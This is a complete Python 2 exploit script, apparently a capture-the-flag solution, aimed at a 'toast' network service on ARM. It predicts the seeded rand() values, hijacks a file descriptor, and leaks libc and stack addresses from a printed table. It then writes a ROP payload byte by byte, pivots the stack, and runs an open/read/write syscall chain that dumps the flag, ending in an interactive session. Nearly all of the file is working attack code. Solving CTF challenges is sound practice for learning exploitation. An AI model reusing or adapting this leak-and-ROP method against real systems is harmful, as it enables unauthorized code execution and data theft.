#!/usr/bin/env python

import socket
import sys
import os
import telnetlib
from struct import pack
from time import sleep


def makered(s):
    return "\033[91m" + s + "\033[0m"

def makegreen(s):
    return "\033[92m" + s + "\033[0m"

if not len(sys.argv) == 3:
    print("Usage: " + sys.argv[0] + " host port")
    quit()

host = sys.argv[1]
port = sys.argv[2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))

toto = raw_input("ready?")

# these are all the rands thrown by rand(), seeded by 0x2e3, minus the 3 first ones wich are used to show status, shift stack by "burning" the t_bread pointer, set the counter i to a big negative value.
rands = [53,123,98,173,248,217,2,35,205,58,60,138,77,235,20,243,46,111,70,70,29,60,246,161,14,203,230,2,125,172,17,178,39,116,95,31,77,97,66,26,156,126,165,233,106,185,220,152,40,35,222,69,95,212,230,109,159,204,111,28,121,129,207,160,245,46,192,66,144,2,92,44,129,1,21,235,186,242,131,226,21,97,40,116,53,14,225,213,219,81,241,84,210,192,244,199,239,180,9,127,183,101,171,56,103,192,35,33,178,166,4,199,7,44,59,60,58,29,17,21,110,3,105,64,195,94,7,178,18,16,49,201,117,220,1,220,157,36,254,79,202,2,23,209,46,82,14,104,111,31,126,221,34,231,29,230,69,36,152,88,52,202,33,170,166,35,134,67,71,132,147,18,134,170,227,180,252,241,29,108,17,155,73,51,130,103,25,200,139,178,32,192,124,65,106,34,100,240,102,172,117,249,190,251,163,161,176,159,147,205,11,164,104,85,215,234,188,241,178,71,163,210,7,31,20,113,65,120,98,167,36,215,160,226,210,67,132,130,227,23,79,238,187,183,67,146,162,255,131,84,71,38,39,78,69,59,192,135,179,34,46,216,249,207,186,203,18,62,78,245,85,157,228,16,85,39,163,247,39,38,75,110,77,114,188,146,173,124,25,97,158,72,57,151,23,243,99,41,50,177,31,135,78,3,152,163,42,59,154,81,97,230,191,174,88,124,65,6,248,90,103,151,162,160,46,185,147,145,227,197,66,2,77,145,5,229,52,47,32,207,129,129,181,64,48,13,188,113,19,181,203,122,76,110,26,122,39,174,12,10,115,78,12,192,223,17,165,20,65,197,227,194,71,152,2,119,165,191,232,185,116,179,51,192,33,78,58,73,252,70,83,111,149,96,48,116,113,213,136,178,155,107,116,226,3,119,89,169,54,65,98,170,244,149,106,22,227,164,95,223,235,178,79,128,18,127,244,132,84,125,54,239,232,171,209,236,34,42,149,88,107,247,2,96,140,108,118,112,16,213,79,251,135,158,123,154,29,112,30,114,237,84,97,213,255,51,193,33,93,86,121,201,77,123,41,218,231,159,74,248,116,153,243,251,56,111,149,85,223,179,199,204,8,41,161,7,92,99,41,185,185,162,130,7,30,171,225,5,74,43,253,190,196,241,186,252,96,79,82,63,3,25,11,11,66,172,18,158,15,59,88,201,222,218,208,252,134,177,1,208,220,255,143,160,240,73,157,80,152,239,143,155,8,154,166,75,70,185,233,86,244,65]

def getrand():
    global rands
    x = rands[0]
    rands = rands[1:]
    return x

print s.recv(1024*1024)
# overwrite the fd of /dev/urandom, feed 4 bytes to the read(0,seed,4) and heat up the -64 slice of bread to show toasts status
s.sendall("How Large Is A Stack Of Toast?\n\x00"+"\xe3\x02\x00\x00"+"-64\n")
sleep(1)
print s.recv(1024*1024)
#overwrite the t_bread pointer
s.sendall("-60\n")
sleep(1)

# get the bread table and save the leaks
data = s.recv(1024*1024)[64:1360]

print data

leak = data.replace('\n','').replace(' ','').split('][')[48:52]
libc_leak = (int(leak[3])<<24) + (int(leak[2])<<16) + (int(leak[1])<<8) + (int(leak[0])) -0xec000

leak = data.replace('\n','').replace(' ','').split('][')[68:72]
stack_leak = (int(leak[3])<<24) + (int(leak[2])<<16) + (int(leak[1])<<8) + (int(leak[0])) - 0x100
stack_leak = stack_leak & 0xffffff00

leak = data.replace('\n','').replace(' ','').split('][')[108:112]
seip_leak = (int(leak[3])<<24) + (int(leak[2])<<16) + (int(leak[1])<<8) + (int(leak[0]))

pivot_addr = libc_leak + 0x00031586+1
pop_stack_8 = 0xc2-0x57
pop_0125pc = libc_leak + 0x0003bb34+1
syscall = libc_leak + 0x000178e4+1
pop_stack_5 = libc_leak + 0x0003c9c0 +1  - 0x10957# pop {r0, r3, r6, r7, pc}

# notes :
# write pop_stack @ 127
# write read_syscall @ 144
# write pc @ 156-159 == pop_0125pc
# write read params 0, stack_leak, length, junk, pc == syscall @ 160-183
# write stack_addr, pc == stack_pivot @ 184-191
# leak = data[48:52]
# stack pivot offset = 0x00031586 # mov sp, r7 ; pop {r4, r7, pc}
# short_overwrite = 0x109c2 # <__libc_csu_init+50>:   ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}
# pop_0125pc = 0x0003bb34 # pop {r0, r1, r2, r5, pc}
# syscall = 0x000178e4 # svc #0 ; pop {r7, pc}

print "------"
print "libc base: " +hex(libc_leak)
print "stack base: " +hex(stack_leak)
print "SEIP : " +hex(seip_leak)
print data
print "------"

def packbytes(addr):
    return [addr&0xff, (addr&0xff00)>>8, (addr&0xff0000)>>16, (addr&0xff000000)>>24 ] 

def p(val):
    return pack('I', val)

pop_12pc = libc_leak + 0x00095cf2+1  # pop {r1, r2, pc}

# this will be the second stage ropchain
dorop = p(0) + p(3) + p(pop_0125pc)
dorop += p(0)+p(stack_leak-0x100)+p(5)+p(0)+p(syscall) # write flag on stack at known address
dorop += p(5)+p(pop_0125pc) + p(stack_leak-0x100) + p(0) + p(0) + p(0)+ p(syscall) # open flag
dorop += p(3) + p(pop_12pc) + p(stack_leak-0x300) + p(0x100) + p(syscall) # read flag
dorop += p(4) + p(pop_0125pc) + p(1) + p(stack_leak-0x300) + p(0x100) + p(0) + p(syscall) # write flag


# here 0xff just means we don't care, 0x00 are the places were we'll write our rop chain
# the first two values will make saved pc goes to <__libc_csu_init+50>:   ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}
payload =  [0x87,0x01,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x3,0x00,0x00,0x00, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xff] 
payload += packbytes(pop_0125pc) + [ 0x00,0x00,0x00,0x00]  + packbytes(stack_leak) + [ 252,0x00,0,0, 0xff,0xff,0xff,0xff ]
payload += packbytes(syscall) + packbytes(stack_leak) + packbytes(pivot_addr)

print "this is the wanted show_bread output :"
print "  0   0   0   0   0   0   0   0   0   0   0   0",
for x in range(len(payload)):
    if (x+12) % 16 == 0:
        print "\n%3u" % payload[x],
    else:
        print "%3u" % payload[x],

toto = raw_input("ready?")
s.sendall("108\n")
sleep(1)

s.recv(1024*1024)[64:1360]

payload_base = 0x6c
def toast(sockserv, pos, show = False):
    if len(str(pos)) == 4:
        sockserv.sendall(str(pos))
    else:
        sockserv.sendall(str(pos)+"\n")
    sleep(0.1)
    if show:
        print sockserv.recv(1024*1024)
    else:
        data = sockserv.recv(1024*1024)
        if 'overheat' in data:
            return False
    return True

trashpos = range(-888,-824) + range(-744,-696) + range(-576,-556) + range(-464,-424) + range(-116,-92) + range(124,128) + range(132,140) + range(156,160) + range(172,256)


# init trash positions
trashposk = {}
for pos in trashpos:
    trashposk[pos] = 0

def dotrash(s, randval):
    couldtrash = False
    for k in trashposk.keys():
        if trashposk[k] + randval < 256:
            print "trashing %d" % k
            trashposk[k] += randval
            toast(s,k)
            couldtrash = True
            break
    return couldtrash


infinite = False
bread_offset = 0x54 # This is the offset where we'll start writing our ropchain
while True:
    try:
        x = getrand()
    except:
        break
    for y in range(len(payload)):
        found = False
        if (payload[y] == 0) or (payload[y] == 255) or (x <= 0):
            pass
        elif x == payload[y]:
            toast(s, payload_base+y, True)
            payload[y] = 0
            found = True
            break
        else:
            for z in rands:
                if ((x+z) == payload[y]) and (z>0):
                    print "writing %d, will complete with %d == %d" % (x,z, payload[y])
                    print "Saving value %d at position %d " % (z, (payload_base+y))
                    toast(s, payload_base+y, True)
                    rands[rands.index(z)] = -(payload_base+y)
                    payload[y] = -(payload_base+y)
                    found = True
                    break
                tutu = """            if x < y - 10:
                toast(s, payload_base+payload.index(y), True)
                payload[payload.index(y)] -= x
                found = True
                break"""
            if found:
                break
    if x < 0 :
        print "writing saved value on position : %d" % x
        toast(s, -x, True)
        try:
            payload[payload.index(x)] = 0
        except:
            print "weird, " + str(x) + " is not in " + payload
        found = True
    if not found:
        if (x > 0x7f) and not infinite:
            # move on to -infinite attempts
            toast(s,95,True)
            infinite = True
        elif not dotrash(s,x):
            print "No more trashpos left :-("
            break


print payload
print len(rands)
sleep(0.1)
s.sendall("q\n")
print "------"
print "target addresses :"
print "stack_addr: " + hex(stack_leak)
print "pop 01235pc: " + hex(pop_0125pc)
print "syscall : " + hex(syscall)
print "pivot: " + hex(pivot_addr)
print "------"
print "Sending final ropchain"
s.send(dorop+"\n")
sleep(0.5)
toto = raw_input("ready?")
s.send("flag\x00"+"\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
